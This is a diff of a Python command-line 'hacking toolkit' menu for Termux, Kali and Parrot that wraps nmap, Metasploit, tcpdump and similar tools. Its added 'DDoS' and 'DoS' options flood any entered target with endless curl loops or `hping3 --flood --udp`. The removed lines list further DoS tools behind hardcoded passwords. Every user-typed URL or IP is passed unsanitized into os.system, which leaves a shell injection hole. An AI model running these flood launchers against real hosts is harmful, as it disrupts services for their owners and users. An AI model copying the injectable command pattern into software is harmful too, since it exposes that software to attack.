@@ -2,126 +2,248 @@ import os
 import subprocess
 import time
 
-# Shared banner and footer templates
-BANNER = """
- ░▒▓██████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
-░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
-░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
-░▒▓█▓▒░      ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓██████▓▒░  ░▒▓██████▓▒░  
-░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░         ░▒▓█▓▒░     
-░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░         ░▒▓█▓▒░     
- ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░ ░▒▓█████████████▓▒░░▒▓████████▓▒░▒▓████████▓▒░  ░▒▓█▓▒░     
-                                                                                                    
-                                                                                  created by: crowley💀
-"""
-
-# Footer definition (added)
-FOOTER = """
-████████████████████████████████████████████████████████████████████████████████████████
-████████████████████████████████████████████████████████████████████████████████████████
-"""
+FOOTER = "║ Select an option and press Enter"
 
 def clear_screen():
-    os.system('clear')
+    os.system("clear")
 
-def show_banner(title=""):
+def show_banner(title):
     clear_screen()
-    print(BANNER)
-    if title:
-        print(f"\n{title}\n")
-    time.sleep(0.5)
+    print(f"""
+╔════════════════════════════════════╗
+║          TOOLKIT CROW              ║
+║         {title.center(30)}         ║
+╚════════════════════════════════════╝
+""")
 
 def ask_continue_or_back():
-    print("(1) Continue process")
-    print("(2) Go back")
-    return input("Enter choice: ") == "1"
-
-def countdown_and_wait():
-    for i in range(10, 0, -1):
-        print(f"{i} seconds until start...")
-        time.sleep(1)
-    input("Press Enter to terminate the tool...")
-
-# Secret module (🔒)
-def secret_module():
-    clear_screen()
-    print("🔒" + "═" * 38 + "🔒")
-    print("║         SECRET MODULE ACCESS         ║")
-    print("🔒" + "═" * 38 + "🔒")
-    pwd = input("Enter secret password: ")
-    if pwd == "Kali linux":
-        print("Acceso al módulo secreto: 5 herramientas OSINT👀")
-        print("1) theHarvester 🕵️ (subdomain enumeration)")
-        print("2) OSRFramework 👣 (OSINT framework)")
-        print("3) Sherlock 🧠 (username lookup)")
-        print("4) Maltego CE 🌐 (link analysis)")
-        print("5) Shodan CLI 🔍 (IoT search)")
-        input("Press Enter to return...")
-    else:
-        print("Password incorrect ⚠️")
-        time.sleep(1)
-
-# Danger module (☠️)
-def danger_module():
-    clear_screen()
-    print("☠️" + "═" * 38 + "☠️")
-    print("║           DANGER MODULE              ║")
-    print("☠️" + "═" * 38 + "☠️")
-    pwd = input("Enter danger password: ")
-    if pwd == "PARROT OS":
-        print("Access granted to DANGER tools: 5 critical utilities")
-        print("1) slowloris.py 🐌 (slow HTTP attack)")
-        print("2) torshammer.py 🌐 (Tor‑based DDoS)")
-        print("3) GoldenEye.py 🔥 (advanced HTTP DoS)")
-        print("4) HTTPFlooder ⚡ (multi‑process flood)")
-        print("5) UDPFlood 🌊 (custom UDP flood)")
-        input("Press Enter to return...")
-    else:
-        print("Password incorrect ⚠️")
-        time.sleep(1)
+    c = input("Continue? (Y/n): ").lower()
+    return c in ["", "y", "yes"]
 
 def install_packages():
     show_banner("INSTALLATION")
-    print("Installing packages for Termux, Kali, Parrot...")
+    print("Installing required packages for Termux, Kali, Parrot...")
+    
     # Termux
     subprocess.run("pkg update && pkg upgrade -y", shell=True)
-    for pkg in ["sudo","nmap","aircrack-ng","python","python3-pip","git","curl","wget","vim","dirb","nikto"]:
+    termux_pkgs = ["sudo", "nmap", "aircrack-ng", "python", "python3-pip", "git", "curl", "wget", "vim", "openssh", "tsu", "net-tools", "unzip", "zip", "htop"]
+    for pkg in termux_pkgs:
         subprocess.run(f"pkg install {pkg} -y", shell=True)
+    
     # Kali
     subprocess.run("apt update && apt upgrade -y", shell=True)
-    for pkg in ["sudo","nmap","aircrack-ng","metasploit-framework","python3-pip","git","curl","wget","vim","gobuster","wpscan"]:
+    kali_pkgs = ["sudo", "nmap", "aircrack-ng", "metasploit-framework", "python3-pip", "git", "curl", "wget", "vim", "net-tools", "unzip", "zip", "htop"]
+    for pkg in kali_pkgs:
         subprocess.run(f"apt install {pkg} -y", shell=True)
+    
     # Parrot
     subprocess.run("sudo apt update && sudo apt upgrade -y", shell=True)
-    subprocess.run("sudo apt install sudo nmap aircrack-ng metasploit-framework python3-pip git curl wget vim feroxbuster dirb -y", shell=True)
+    parrot_pkgs = ["sudo", "nmap", "aircrack-ng", "metasploit-framework", "python3-pip", "git", "curl", "wget", "vim", "net-tools", "unzip", "zip", "htop"]
+    subprocess.run("sudo apt install " + " ".join(parrot_pkgs) + " -y", shell=True)
+
     print("All packages installed.")
     input("Press Enter to return to menu...")
 
-# MAIN MENU
-def main_menu():
+def termux_menu():
     while True:
-        show_banner("MAIN")
+        show_banner("TERMUX")
         print("""\
-║ (1) Termux Menu
-║ (2) Kali Linux Menu
-║ (3) Parrot OS Menu
-║ (4) Install Necessary Packages
-║ (5) Exit""")
+║ (1) Sniffer 🕵️‍♂️
+║ (2) Check web/IP status 🌐
+║ (3) HTTP requests 🔗
+║ (4) Secret 🔒
+║ (5) DDoS ⚡
+║ (6) DoS 🔥
+║ (7) Anti‑DDoS check 🛡️
+║ (8) Vulnerability scan 🕵️‍♀️
+║ (9) Port scan 🌍
+║ (10) Show my IP 🌐
+║ (11) Danger ☠️
+║ (12) Install Packages 📦
+║ (13) Back ⇦""")
         print(FOOTER)
         choice = input("Select an option: ")
+        
+        if choice == "1" and ask_continue_or_back():
+            os.system("tcpdump -c 100")
+        elif choice == "2" and ask_continue_or_back():
+            url = input("Enter URL: ")
+            os.system(f"curl -Is {url} | head -n1")
+        elif choice == "3" and ask_continue_or_back():
+            url = input("Enter URL: ")
+            os.system(f"httpie {url}")
+        elif choice == "4":
+            if ask_continue_or_back():
+                print("Secret option (protected)")  # Aquí va el módulo secreto
+        elif choice == "5" and ask_continue_or_back():
+            target = input("Target URL/IP: ")
+            bots = input("Number of bots (inf for infinite): ")
+            if bots == "inf":
+                input("Press Enter to start (Ctrl+C to stop)...")
+                while True:
+                    os.system(f"curl {target} --silent > /dev/null")
+            else:
+                for _ in range(int(bots)):
+                    os.system(f"curl {target}")
+        elif choice == "6" and ask_continue_or_back():
+            target = input("Target IP: ")
+            os.system(f"hping3 --flood --udp {target}")
+        elif choice == "7" and ask_continue_or_back():
+            url = input("Enter URL: ")
+            os.system(f"whatweb {url}")
+        elif choice == "8" and ask_continue_or_back():
+            target = input("Target IP/Domain: ")
+            os.system(f"nmap --script vuln {target}")
+        elif choice == "9" and ask_continue_or_back():
+            target = input("Target IP/Domain: ")
+            os.system(f"nmap -p- {target}")
+        elif choice == "10" and ask_continue_or_back():
+            os.system("curl ifconfig.me")
+        elif choice == "11" and ask_continue_or_back():
+            print("Modo peligroso")
+            os.system("echo Danger mode activated!")  # Sustituir por módulo real
+        elif choice == "12":
+            install_packages()
+        elif choice == "13":
+            break
+        time.sleep(1)
+
+def kali_menu():
+    while True:
+        show_banner("KALI LINUX")
+        print("""\
+║ (1) Nmap 🔍
+║ (2) Metasploit ⚔️
+║ (3) DDoS ⚡
+║ (4) DoS 🔥
+║ (5) Aircrack-ng 📶
+║ (6) Hydra 🔐
+║ (7) OSINT 🕵️
+║ (8) Credits 🏷️
+║ (9) Scan IP 🌐
+║ (10) Web status 🌐
+║ (11) Anti‑DDoS check 🛡️
+║ (12) Vuln scan 🕵️‍♂️
+║ (13) Sniffer 👻
+║ (14) HTTPS requests 🔗
+║ (15) Danger ☠️
+║ (16) Install Packages 📦
+║ (17) Back ⇦""")
+        print(FOOTER)
+        choice = input("Select an option: ")
+        
+        if choice == "1" and ask_continue_or_back():
+            os.system("nmap -h")
+        elif choice == "2" and ask_continue_or_back():
+            os.system("msfconsole")
+        elif choice == "3" and ask_continue_or_back():
+            target = input("Target URL/IP: ")
+            bots = input("Bots (inf): ")
+            if bots == "inf":
+                input("Enter→start, Ctrl+C→stop")
+                while True:
+                    os.system(f"curl {target}")
+            else:
+                for _ in range(int(bots)):
+                    os.system(f"curl {target}")
+        elif choice == "4" and ask_continue_or_back():
+            ip = input("Enter IP: ")
+            os.system(f"hping3 --flood --udp {ip}")
+        elif choice == "5" and ask_continue_or_back():
+            os.system("aircrack-ng --help")
+        elif choice == "6" and ask_continue_or_back():
+            os.system("hydra -h")
+        elif choice == "7" and ask_continue_or_back():
+            os.system("theHarvester -h")
+        elif choice == "8":
+            clear_screen()
+            print("Created by crowley and szkryy")
+            input("Press Enter to go back...")
+        elif choice == "9" and ask_continue_or_back():
+            ip = input("Enter IP: ")
+            os.system(f"nmap {ip}")
+        elif choice == "10" and ask_continue_or_back():
+            web = input("Enter URL: ")
+            os.system(f"curl -I {web}")
+        elif choice == "11" and ask_continue_or_back():
+            web = input("Enter URL: ")
+            os.system(f"whatweb {web}")
+        elif choice == "12" and ask_continue_or_back():
+            dom = input("Enter IP/Domain: ")
+            os.system(f"nmap --script vuln {dom}")
+        elif choice == "13" and ask_continue_or_back():
+            os.system("tcpdump -c 100")
+        elif choice == "14" and ask_continue_or_back():
+            url = input("Enter URL: ")
+            os.system(f"httpie {url}")
+        elif choice == "15" and ask_continue_or_back():
+            print("Modo peligroso")
+        elif choice == "16":
+            install_packages()
+        elif choice == "17":
+            break
+        time.sleep(1)
+
+def parrot_menu():
+    while True:
+        show_banner("PARROT OS")
+        print("""\
+║ (1) Nmap 🔍
+║ (2) Metasploit ⚔️
+║ (3) DDoS ⚡
+║ (4) DoS 🔥
+║ (5) Aircrack-ng 📶
+║ (6) Hydra 🔐
+║ (7) TheHarvester 🕵️
+║ (8) OSRFramework 👣
+║ (9) Sherlock 🧠
+║ (10) Nikto 🧰
+║ (11) Exploit DB 🧨
+║ (12) WAFW00F 🦺
+║ (13) Tor 👻
+║ (14) SQLMap 🐍
+║ (15) Sniffer 🕳️
+║ (16) HTTPie 🔗
+║ (17) Danger ☠️
+║ (18) Install Packages 📦
+║ (19) Back ⇦""")
+        print(FOOTER)
+        choice = input("Select an option: ")
+        
+        if choice == "17" and ask_continue_or_back():
+            print("Modo peligroso")
+        elif choice == "18":
+            install_packages()
+        elif choice == "19":
+            break
+        else:
+            print("Option under development...")
+        time.sleep(1)
+
+def main_menu():
+    while True:
+        show_banner("MAIN MENU")
+        print("""\
+║ (1) Termux 📱
+║ (2) Kali Linux 🐉
+║ (3) Parrot OS 🦜
+║ (4) Install All Packages 📦
+║ (5) Exit ❌""")
+        print(FOOTER)
+        choice = input("Select an option: ")
+
         if choice == "1":
-            termux_menu()  # Needs to be defined
+            termux_menu()
         elif choice == "2":
-            kali_menu()  # Needs to be defined
+            kali_menu()
         elif choice == "3":
-            parrot_menu()  # Needs to be defined
+            parrot_menu()
         elif choice == "4":
             install_packages()
         elif choice == "5":
+            print("Goodbye, hackercito hermoso!")
             break
-        else:
-            print("Invalid option.")
-            time.sleep(1)
+        time.sleep(1)
 
 if __name__ == "__main__":
     main_menu()
